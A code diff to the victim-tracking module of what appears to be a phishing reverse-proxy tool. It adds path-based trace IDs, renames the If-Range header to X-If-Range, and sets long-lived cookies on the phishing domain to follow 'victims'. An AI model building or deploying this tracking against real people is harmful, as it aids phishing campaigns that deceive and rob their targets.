@@ -33,6 +33,7 @@ type Tracker struct {
 	session.SessionModule
 
 	Enabled        bool
+	Type           string
 	Identifier     string
 	ValidatorRegex *regexp.Regexp
 
@@ -81,6 +82,7 @@ func Load(s *session.Session) (m *Tracker, err error) {
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
 		Enabled:       s.Config.Tracking.Enabled,
+		Type:          s.Config.Tracking.Type,
 	}
 
 	if !m.Enabled {
@@ -108,6 +110,7 @@ func Load(s *session.Session) (m *Tracker, err error) {
 
 // IsValid validates the tracking value
 func (t *Trace) IsValid() bool {
+	// t.Warning("Validating: %s with %s = %v", t.ID, t.ValidatorRegex, t.ValidatorRegex.MatchString(t.ID))
 	return t.ValidatorRegex.MatchString(t.ID)
 }
 
@@ -164,34 +167,55 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 		return
 	}
 
-	newTracking := true
+	noTraces := true
 
 	//
-	// Trace order checks:
-	// - URL.query
-	// - HTTP Cookie
+	// Tracing types: Path || Query (default)
 	//
-	// module.Debug("Making trace: %s", request.URL.Query().Get(module.Identifier))
-	t = module.makeTrace(request.URL.Query().Get(module.Identifier))
-	if !t.IsValid() {
-
-		// Checking Cookies
-		c, err := request.Cookie(module.Identifier)
-		if err == nil {
-			t.ID = c.Value
-
-			// Validate cookie content
-			if t.IsValid() {
-				newTracking = false
-			}
+	if module.Type == "path" {
+		re := regexp.MustCompile(`/([^/]+)`)
+		match := re.FindStringSubmatch(request.URL.Path)
+		if len(match) > 0 {
+			t = module.makeTrace(match[1])
 		}
-	} else {
-		newTracking = false
 	}
 
-	if newTracking {
-		// module.Debug("No traces found in defined channels")
+	if t.IsValid() {
+		noTraces = false
+		request.Header.Set("If-Landing-Redirect", strings.ReplaceAll(request.URL.Path, t.ID, "") )
+		request.Header.Set("X-If-Range", t.ID)
+	} else {
+
+		// Fallback
+		// Use Query String
+		t = module.makeTrace(request.URL.Query().Get(module.Identifier))
+		if t.IsValid() {
+			noTraces = false
+		} else {
+			// Checking Cookies
+			c, err := request.Cookie(module.Identifier)
+			if err == nil {
+				t.ID = c.Value
+
+				// Validate cookie content
+				if t.IsValid() {
+					module.Warning("Fetched victim from cookies: %s", tui.Bold(tui.Red(t.ID)))
+					noTraces = false
+				}
+			}
+		}
+	}
+
+	if noTraces {
+		module.Debug("No traces found in defined channels")
 		t.ID = module.makeID()
+	} else {
+
+		//
+		// Set trackers:
+		// - HTTP Header X-If-Range
+		request.Header.Set("X-If-Range", t.ID)
+
 	}
 
 	// Check if the Trace ID is bind to an existing victim
@@ -215,8 +239,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 	//
 	// Set trackers:
-	// - HTTP Header If-Range
-	request.Header.Set("If-Range", t.ID)
+	// - HTTP Header X-If-Range
+	request.Header.Set("X-If-Range", t.ID)
 	return
 }
 
@@ -228,38 +252,40 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
 		return
 	}
 
+
 	trackingFound := false
-	t := module.makeTrace(response.Request.Header.Get("If-Range"))
-	if t.IsValid() {
-		response.Header.Add("Set-Cookie",
-			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				module.Identifier, t.ID, module.Session.Config.Proxy.Phishing))
+	t := module.makeTrace("")
 
-		trackingFound = true
-	} else {
-
-		// Trace not found in If-Range HTTP Header, check cookies
-		for _, cookie := range response.Request.Cookies() {
-			if cookie.Name == module.Identifier {
-				t.ID = cookie.Value
-				if t.IsValid() {
-					_, err := t.GetVictim(t)
-					if err == nil {
-						trackingFound = true
-					}
-				}
-				break
-			}
+	// Check cookies first to avoid replacing issues
+	for _, cookie := range response.Request.Cookies() {
+		if cookie.Name == module.Identifier {
+			t.ID = cookie.Value
+			trackingFound = t.IsValid()
+			break
 		}
 	}
 
 	if !trackingFound {
-		module.Debug("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
+		// Trace not found in Cookies check X-If-Range HTTP Header
+		t = module.makeTrace(response.Request.Header.Get("X-If-Range"))
+		if t.IsValid() {
+			response.Header.Add("Set-Cookie",
+				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
+					module.Identifier, t.ID, module.Session.Config.Proxy.Phishing))
+			response.Header.Add("X-If-Range", t.ID)
+
+			module.Info("Found tracking in X-If-Range .. pushing cookie %s", response.Request.URL)
+			trackingFound = true
+		}
+	}
+
+	if !trackingFound {
+		module.Info("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
 	} else {
 		var err error
 		victim, err = t.GetVictim(t)
 		if err != nil {
-			module.Debug("Error: cannot retrieve Victim from tracker: %s", err)
+			module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
 		}
 	}
 
